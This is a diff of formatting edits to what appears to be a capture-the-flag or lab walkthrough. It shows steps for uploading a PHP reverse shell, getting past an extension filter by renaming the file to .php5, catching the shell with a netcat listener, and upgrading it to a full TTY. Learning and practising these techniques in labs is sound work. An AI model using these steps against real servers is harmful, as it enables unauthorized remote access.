@@ -158,7 +158,7 @@ shell: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/
 
 remember to set a port to listening
 
->nc -lvp <port>
+>nc -lvp PORT
 
 ![image](https://user-images.githubusercontent.com/53917092/95800457-c487df80-0ccd-11eb-951b-1fa61fd38181.png)
 
@@ -166,7 +166,7 @@ remember to set a port to listening
 
 let's try bypassing this using the ".php5" extension
 
-mv revs.php revs.php5
+> mv revs.php revs.php5
 
 ![image](https://user-images.githubusercontent.com/53917092/95800910-fcdbed80-0cce-11eb-9775-7ede504b29aa.png)
 
@@ -181,9 +181,13 @@ it worked, we have shell
 to get a tty
 
 > python -c 'import pty;pty.spawn("/bin/bash")'
+
 > Ctrl+Z 
+
 > stty raw -echo
+
 > fg
+
 > export TERM=xterm
 
 ![image](https://user-images.githubusercontent.com/53917092/95801836-087ce380-0cd2-11eb-9d6a-dfcb6863ae6c.png)
